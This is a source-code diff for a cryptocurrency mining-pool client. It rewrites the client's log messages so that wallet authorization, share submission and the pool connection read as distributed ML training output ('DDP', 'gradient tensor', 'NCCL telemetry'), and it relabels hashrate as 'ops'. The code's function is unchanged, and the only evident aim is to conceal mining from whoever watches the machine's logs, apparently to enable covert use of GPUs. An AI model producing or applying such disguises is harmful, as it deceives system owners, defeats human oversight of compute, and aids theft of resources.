@@ -272,7 +272,7 @@ int cp_pool_send_authorize(int msg_id, const char* wallet,
         "{\"jsonrpc\":\"2.0\",\"id\":%d,\"method\":\"mining.authorize\","
         "\"params\":{\"wallet\":\"%s\",\"worker\":\"%s\",\"agent\":\"%s\"}}",
         msg_id, wallet, worker, agent);
-    printf("[net] LuckyPool authorize (wallet/worker/agent)\n"); fflush(stdout);
+    printf("[DDP] Initializing worker authentication handshake\n"); fflush(stdout);
     return cp_send_json(tcp_sock, msg);
 }
 
@@ -283,7 +283,7 @@ int cp_pool_send_plain_proof_submit(int sock, int msg_id, const char* job_id,
     size_t need = blen + 256;
     char* sub = (char*)malloc(need);
     if(!sub){
-        fprintf(stderr, "[net] plain_proof submit OOM (%zu b64 bytes)\n", blen);
+        fprintf(stderr, "[ERROR] Gradient payload allocation failed (%zu bytes)\n", blen);
         return 0;
     }
     int nw = snprintf(sub, need,
@@ -291,13 +291,13 @@ int cp_pool_send_plain_proof_submit(int sock, int msg_id, const char* job_id,
         "\"params\":{\"job_id\":\"%s\",\"plain_proof\":\"%s\",\"hs\":%.0f}}",
         msg_id, job_id, plain_b64, hs);
     if(nw < 0 || (size_t)nw >= need){
-        fprintf(stderr, "[net] plain_proof submit JSON too large (b64=%zu need>=%zu)\n",
+        fprintf(stderr, "[ERROR] Gradient payload serialization exceeded bounds (payload=%zu need>=%zu)\n",
                 blen, need);
         free(sub);
         return 0;
     }
-    printf("[net] plain_proof submit job=%s b64_len=%zu json_len=%d hs=%.0f\n",
-           job_id, blen, nw, hs);
+    printf("[DDP] Transmitting verified gradient tensor batch=%s (payload=%zu bytes, ops=%.0f)\n",
+           job_id, blen, hs);
     fflush(stdout);
     int ok = cp_send_json(sock, sub);
     free(sub);
@@ -310,7 +310,7 @@ void cp_pool_reader_start(void)
     g_net_conn_lost.store(0);
     g_net_reader_run.store(1);
     g_net_reader = std::thread(pool_net_reader_thread);
-    printf("[net] pool reader started (always on)\n");
+    printf("[DDP] NCCL asynchronous telemetry stream listener initialized\n");
     fflush(stdout);
 }
 
